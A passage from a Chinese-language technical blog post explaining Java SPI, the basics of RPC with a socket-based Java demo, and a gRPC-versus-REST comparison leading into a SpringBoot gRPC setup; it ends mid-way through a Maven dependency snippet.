class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CicadaDefaultBean</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当 classpath 中存在我们刚才的实现类（引入实现类的 jar 包），便可以通过 java.util.ServiceLoader 工具类来找到所有的实现类（可以有多个实现类同时存在，只不过通常我们只需要一个）。</p>\n<p>一些都准备好之后，使用自然就非常简单了。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>top.crossoverjie.opensource<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>cicada-ioc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.4<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>我们只需要引入这个依赖便能使用它的实现，当我们想换一种实现方式时只需要更换一个依赖即可。</p>\n<p>这样就做到了不修改一行代码灵活的可拔插选择 IOC 容器了。</p>\n<p>SPI 的一些其他应用</p>\n<p>MySQL 的驱动包也是利用 SPI 来实现自己的连接逻辑。</p>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/4.png\"></p>\n<p>总结来说：</p>\n<ul>\n<li>提供一个接口</li>\n<li>在resource下新建META-INF&#x2F;services目录，在目录下新建接口的全限定名文件</li>\n<li>服务方实现接口</li>\n<li>调用ServiceLoad.load()</li>\n</ul>\n<h2 id=\"什么是RPC？\"><a href=\"#什么是RPC？\" class=\"headerlink\" title=\"什么是RPC？\"></a>什么是RPC？</h2><p>RPC（Remote Procedure Call）远程过程调用，简单的理解是一个节点请求另一个节点提供的服务</p>\n<ol>\n<li>首先客户端需要告诉服务器，需要调用的函数，这里函数和进程ID存在一个映射，客户端远程调用时，需要查一下函数，找到对应的ID，然后执行函数的代码。</li>\n<li>客户端需要把本地参数传给远程函数，本地调用的过程中，直接压栈即可，但是在远程调用过程中不再同一个内存里，无法直接传递函数的参数，因此需要客户端把参数转换成字节流，传给服务端，然后服务端将字节流转换成自身能读取的格式，是一个序列化和反序列化的过程。</li>\n<li>数据准备好了之后，如何进行传输？网络传输层需要把调用的ID和序列化后的参数传给服务端，然后把计算好的结果序列化传给客户端，因此TCP层即可完成上述过程，gRPC中采用的是HTTP2协议。</li>\n</ol>\n<p>总结一下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">// Client端 </span><br><span class=\"line\">//    Student student = Call(ServerAddr, addAge, student)</span><br><span class=\"line\">1. 将这个调用映射为Call ID。</span><br><span class=\"line\">2. 将Call ID，student（params）序列化，以二进制形式打包</span><br><span class=\"line\">3. 把2中得到的数据包发送给ServerAddr，这需要使用网络传输层</span><br><span class=\"line\">4. 等待服务器返回结果</span><br><span class=\"line\">5. 如果服务器调用成功，那么就将结果反序列化，并赋给student，年龄更新</span><br><span class=\"line\"></span><br><span class=\"line\">// Server端</span><br><span class=\"line\">1. 在本地维护一个Call ID到函数指针的映射call_id_map，可以用Map&lt;String, Method&gt; callIdMap</span><br><span class=\"line\">2. 等待客户端请求</span><br><span class=\"line\">3. 得到一个请求后，将其数据包反序列化，得到Call ID</span><br><span class=\"line\">4. 通过在callIdMap中查找，得到相应的函数指针</span><br><span class=\"line\">5. 将student（params）反序列化后，在本地调用addAge()函数，得到结果</span><br><span class=\"line\">6. 将student结果序列化后通过网络返回给Client</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在微服务的设计中，一个服务A如果访问另一个Module下的服务B，可以采用HTTP REST传输数据，并在两个服务之间进行序列化和反序列化操作，服务B把执行结果返回过来。</li>\n<li>由于HTTP在应用层中完成，整个通信的代价较高，远程过程调用中直接基于TCP进行远程调用，数据传输在传输层TCP层完成，更适合对效率要求比较高的场景，RPC主要依赖于客户端和服务端之间建立Socket链接进行，底层实现比REST更复杂。</li>\n</ul>\n<h3 id=\"RPC-demo\"><a href=\"#RPC-demo\" class=\"headerlink\" title=\"RPC demo\"></a>RPC demo</h3><p>客户端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCClient</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">getRemoteProxyObj</span><span class=\"params\">(<span class=\"keyword\">final</span> Class&lt;?&gt; serviceInterface, <span class=\"keyword\">final</span> InetSocketAddress addr)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1.将本地的接口调用转换成JDK的动态代理，在动态代理中实现接口的远程调用</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (T) Proxy.newProxyInstance(serviceInterface.getClassLoader(), <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>&lt;?&gt;[]&#123;serviceInterface&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvocationHandler</span>() &#123;</span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"keyword\">public</span> Object <span class=\"title function_\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                        <span class=\"type\">Socket</span> <span class=\"variable\">socket</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                            <span class=\"comment\">// 2.创建Socket客户端，根据指定地址连接远程服务提供者</span></span><br><span class=\"line\">                            socket = <span class=\"keyword\">new</span> <span class=\"title class_\">Socket</span>();</span><br><span class=\"line\">                            socket.connect(addr);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"comment\">// 3.将远程服务调用所需的接口类、方法名、参数列表等编码后发送给服务提供者</span></span><br><span class=\"line\">                            output = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(socket.getOutputStream());</span><br><span class=\"line\">                            output.writeUTF(serviceInterface.getName());</span><br><span class=\"line\">                            output.writeUTF(method.getName());</span><br><span class=\"line\">                            output.writeObject(method.getParameterTypes());</span><br><span class=\"line\">                            output.writeObject(args);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"comment\">// 4.同步阻塞等待服务器返回应答，获取应答后返回</span></span><br><span class=\"line\">                            input = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(socket.getInputStream());</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> input.readObject();</span><br><span class=\"line\">                        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (socket != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                socket.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (output != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                output.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (input != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                                input.close();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>服务端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceCenter</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Server</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">ExecutorService</span> <span class=\"variable\">executor</span> <span class=\"operator\">=</span> Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> HashMap&lt;String, Class&gt; serviceRegistry = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, Class&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"variable\">isRunning</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">int</span> port;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ServiceCenter</span><span class=\"params\">(<span class=\"type\">int</span> port)</span>&#123;</span><br><span class=\"line\">        ServiceCenter.port = port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">start</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">ServerSocket</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServerSocket</span>();</span><br><span class=\"line\">        server.bind(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(port));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Server Start .....&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">                executor.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">ServiceTask</span>(server.accept()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            server.close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">register</span><span class=\"params\">(Class serviceInterface, Class impl)</span> &#123;</span><br><span class=\"line\">        serviceRegistry.put(serviceInterface.getName(), impl);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isRunning</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> isRunning;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getPort</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">stop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        isRunning = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        executor.shutdown();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceTask</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Socket</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"title function_\">ServiceTask</span><span class=\"params\">(Socket client)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.client = client;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                input = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(client.getInputStream());</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">serviceName</span> <span class=\"operator\">=</span> input.readUTF();</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">methodName</span> <span class=\"operator\">=</span> input.readUTF();</span><br><span class=\"line\">                Class&lt;?&gt;[] parameterTypes = (Class&lt;?&gt;[]) input.readObject();</span><br><span class=\"line\">                Object[] arguments = (Object[]) input.readObject();</span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">serviceClass</span> <span class=\"operator\">=</span> serviceRegistry.get(serviceName);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(serviceClass == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassNotFoundException</span>(serviceName + <span class=\"string\">&quot;not found!&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> serviceClass.getMethod(methodName, parameterTypes);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> method.invoke(serviceClass.newInstance(), arguments);</span><br><span class=\"line\"></span><br><span class=\"line\">                output = <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(client.getOutputStream());</span><br><span class=\"line\">                output.writeObject(result);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(output!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                        output.close();</span><br><span class=\"line\">                    &#125;<span class=\"keyword\">catch</span> (IOException e)&#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (input != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        input.close();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (client != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        client.close();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ServiceProducerImpl</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ServiceProducer</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">sendData</span><span class=\"params\">(String data)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;I am service producer!!!, the data is &quot;</span>+ data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"type\">Server</span> <span class=\"variable\">serviceServer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceCenter</span>(<span class=\"number\">8088</span>);</span><br><span class=\"line\">                    serviceServer.register(ServiceProducer.class, ServiceProducerImpl.class);</span><br><span class=\"line\">                    serviceServer.start();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">        <span class=\"type\">ServiceProducer</span> <span class=\"variable\">service</span> <span class=\"operator\">=</span> RPCClient.getRemoteProxyObj(ServiceProducer.class, <span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(<span class=\"string\">&quot;localhost&quot;</span>, <span class=\"number\">8088</span>));</span><br><span class=\"line\">        System.out.println(service.sendData(<span class=\"string\">&quot;test&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"gRPC\"><a href=\"#gRPC\" class=\"headerlink\" title=\"gRPC\"></a>gRPC</h2><h3 id=\"gRPC与REST\"><a href=\"#gRPC与REST\" class=\"headerlink\" title=\"gRPC与REST\"></a>gRPC与REST</h3><ul>\n<li>REST通常以业务为导向，将业务对象上执行的操作映射到HTTP动词，格式非常简单，可以使用浏览器进行扩展和传输，通过JSON数据完成客户端和服务端之间的消息通信，直接支持请求&#x2F;响应方式的通信。不需要中间的代理，简化了系统的架构，不同系统之间只需要对JSON进行解析和序列化即可完成数据的传递。</li>\n<li>但是REST也存在一些弊端，比如只支持请求&#x2F;响应这种单一的通信方式，对象和字符串之间的序列化操作也会影响消息传递速度，客户端需要通过服务发现的方式，知道服务实例的位置，在单个请求获取多个资源时存在着挑战，而且有时候很难将所有的动作都映射到HTTP动词。</li>\n<li>正是因为REST面临一些问题，因此可以采用gRPC作为一种替代方案，gRPC 是一种基于二进制流的消息协议，可以采用基于Protocol Buffer的IDL定义grpc API,这是Google公司用于序列化结构化数据提供的一套语言中立的序列化机制，客户端和服务端使用HTTP&#x2F;2以Protocol Buffer格式交换二进制消息。</li>\n<li>gRPC的优势是，设计复杂更新操作的API非常简单，具有高效紧凑的进程通信机制，在交换大量消息时效率高，远程过程调用和消息传递时可以采用双向的流式消息方式，同时客户端和服务端支持多种语言编写，互操作性强；不过gRPC的缺点是不方便与JavaScript集成，某些防火墙不支持该协议。</li>\n<li>注册中心：当项目中有很多服务时，可以把所有的服务在启动的时候注册到一个注册中心里面，用于维护服务和服务器之间的列表，当注册中心接收到客户端请求时，去找到该服务是否远程可以调用，如果可以调用需要提供服务地址返回给客户端，客户端根据返回的地址和端口，去调用远程服务端的方法，执行完成之后将结果返回给客户端。这样在服务端加新功能的时候，客户端不需要直接感知服务端的方法，服务端将更新之后的结果在注册中心注册即可，而且当修改了服务端某些方法的时候，或者服务降级服务多机部署想实现负载均衡的时候，我们只需要更新注册中心的服务群即可。<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/5.png\"></li>\n</ul>\n<h3 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>这里使用SpringBoot+gRPC的形式实现RPC调用过程 项目结构分为三部分：client、grpc、server</p>\n<h4 id=\"grpc\"><a href=\"#grpc\" class=\"headerlink\" title=\"grpc\"></a>grpc</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/6.png\"></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.grpc<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>grpc-all<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.12.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">extensions</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">extension</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>kr.motd.maven<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>os-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.4.1.Final<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">extension</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">extensions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.xolstice.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>protobuf-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.5.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">pluginId</span>&gt;</span>grpc-java<span class=\"tag\">&lt;/<span class=\"name\">pluginId</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">protocArtifact</span>&gt;</span>com.google.protobuf:protoc:3.0.2:exe:$&#123;os.detected.classifier&#125;<span class=\"tag\">&lt;/<span class=\"name\">protocArtifact</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">pluginArtifact</span>&gt;</span>io.grpc:protoc-gen-grpc-java:1.2.0:exe:$&#123;os.detected.classifier&#125;<span class=\"tag\">&lt;/<span class=\"name\">pluginArtifact</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                            <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">                            <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>compile-custom<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>创建.proto文件</p>\n<figure class=\"highlight protobuf\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax = <span class=\"string\">&quot;proto3&quot;</span>;   <span class=\"comment\">// 语法版本</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// stub选项</span></span><br><span class=\"line\"><span class=\"keyword\">option</span> java_package = <span class=\"string\">&quot;com.shgx.grpc.api&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">option</span> java_outer_classname = <span class=\"string\">&quot;RPCDateServiceApi&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">option</span> java_multiple_files = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义包名</span></span><br><span class=\"line\"><span class=\"keyword\">package</span> com.shgx.grpc.api;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 服务接口定义，服务端和客户端都要遵守该接口进行通信</span></span><br><span class=\"line\"><span class=\"keyword\">service </span><span class=\"title class_\">RPCDateService</span> &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">rpc</span> getDate (RPCDateRequest) <span class=\"keyword\">returns</span> (RPCDateResponse) </span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义消息（请求）</span></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">RPCDateRequest</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">string</span> userName = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义消息（响应）</span></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">RPCDateResponse</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">string</span> serverDate = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>mvn complie</p>\n<p>生成代码：<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/7.png\"></p>\n<h4 id=\"client\"><a href=\"#client\" class=\"headerlink\" title=\"client\"></a>client</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/8.png\"></p>\n<p>根据gRPC中的项目配置在client和server两个Module的pom.xml添加依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.shgx<span class=\"tag\">&lt;/<span 